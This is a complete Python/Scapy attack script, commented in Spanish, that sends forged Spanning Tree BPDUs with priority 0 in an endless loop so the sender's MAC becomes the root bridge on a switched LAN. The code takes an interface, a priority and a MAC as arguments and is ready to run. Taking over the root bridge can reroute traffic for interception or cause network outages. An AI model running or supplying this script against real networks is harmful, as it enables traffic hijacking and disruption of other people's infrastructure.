#!/usr/bin/env python3

from scapy.all import *
import sys
import time

def stp_root_attack(interface, priority=0, mac_address=None):
    """
    Envía BPDUs maliciosos para convertirse en Root Bridge
    """

    if mac_address is None:
        mac_address = "00:00:00:00:00:01"

    print(f"[*] Iniciando ataque STP Root Bridge en {interface}")
    print(f"[*] Prioridad: {priority}")
    print(f"[*] MAC Address: {mac_address}")
    print("[*] Presiona Ctrl+C para detener\n")

    # Construir BPDU malicioso
    bpdu = Dot3(dst="01:80:c2:00:00:00", src=mac_address) / \
           LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
           STP(proto=0, version=0, bpdutype=0,
               rootid=priority,
               rootmac=mac_address,
               bridgeid=priority,
               bridgemac=mac_address,
               portid=0x8001,
               age=1,
               maxage=20,
               hellotime=2,
               fwddelay=15)

    try:
        while True:
            sendp(bpdu, iface=interface, verbose=False)
            print(f"[+] BPDU enviado - Root ID: {priority} | MAC: {mac_address}")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Ataque detenido")
        sys.exit(0)

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Uso: python3 stp_attack.py <interfaz> [prioridad] [mac]")
        print("Ejemplo: python3 stp_attack.py eth0 0 00:00:00:00:00:01")
        sys.exit(1)

    iface = sys.argv[1]
    prio = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    mac = sys.argv[3] if len(sys.argv) > 3 else None

    stp_root_attack(iface, prio, mac)